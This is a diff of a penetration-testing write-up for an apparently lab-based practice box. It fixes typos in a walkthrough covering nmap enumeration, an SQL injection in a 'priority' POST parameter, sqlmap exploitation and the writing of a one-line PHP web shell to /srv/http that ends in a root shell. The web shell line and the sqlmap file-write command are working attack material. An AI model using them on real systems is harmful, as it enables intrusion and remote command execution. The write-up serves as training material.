@@ -7,7 +7,7 @@ This is an Offensive Security proving grounds practice box.
 
 # enumeration
 
-Startting with a simple `nmap` scan to identify the attack surface of the target.
+Starting with a simple `nmap` scan to identify the attack surface of the target.
 
 ## nmap
 ```bash
@@ -67,7 +67,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.18 seconds
 ## dir busting
 > There are three different web servers on the target.  
 >  
-> Dir busting the services with tools like `dirb` or `gobuster` expose the following relevant resources.  
+> Dir busting the services with tools like `dirb` or `gobuster` exposes the following relevant resources.  
 > - on port 30455: `/phpinfo.php`
 > - on port 50080: `/cloud` (`mycloud` instance)
 {: .prompt-info }
@@ -121,7 +121,11 @@ The application is a issue tracker with a lot of input sinks.
 ...
 ```
 
-The final `SQL` query is built with the variable `priority` which is integrated as user input without any sanitization.
+The final `SQL` query is built with the variable `priority` which is integrated as user input without any sanitization.  
+This `POST` request seem to be 'hidden' in the context of black box testing, as we were not able identify it by going through the application earlier.  
+
+> This emphasizes the importance of code review and how it usally is more reliable then a simple black box test.
+{: .prompt-info }
 
 ### vulnerable post request
 ```http
@@ -145,7 +149,11 @@ priority=123
 
 ### exploit it with sqlmap
 
-1. In `burpsuite`: craft post request -> right click inside request -> `Save item` -> save it to disk.
+1. In `burpsuite`
+    - craft post request
+    - right click inside request
+    - `Save item`
+    - save it to disk.
 2. Load the saved request into `sqlmap`
 
 ```bash
@@ -175,7 +183,7 @@ Parameter: priority (POST)
 
 ```
 
-> `SQLMap` identified the `SQLi`s
+> `SQLMap` identified the `SQLi`
 {: .prompt-info }
 
 ---
@@ -183,10 +191,10 @@ Parameter: priority (POST)
 # post exploitation
 
 Our goal here will be to write a `web shell` to the target.  
-So before we can write the shell, we need to check where the `www` root folder of the targt server is located. 
+Before we can write the shell, we need to check where the `www` root folder of the targt server is located. 
 
 ## determine web folder
-The `phphinfo.php` file we detected earlier on `http://192.168.152.147:30455` leas a web folder location.  
+The `phphinfo.php` file we detected earlier on `http://192.168.152.147:30455` leaks a web folder location.  
 
 > `$_SERVER['DOCUMENT_ROOT']	/srv/http`
 {: .prompt-info }
@@ -247,6 +255,7 @@ files saved to [1]:
 <?php system($_REQUEST['cmd']); ?>
 ```
 
+`SQLMap` command
 ```bash
 $ sqlmap --random-agent -r hawat.request --file-write=/home/void/Documents/offsec/shell.php --file-dest=/srv/http/shell.php                                                                                                           1 ⨯
         ___
@@ -314,7 +323,7 @@ Content-Length: 61
 root
 ```
 
-> And we got a root shell!
+> And we got a `root` shell!
 {: .prompt-info }
 
 ---
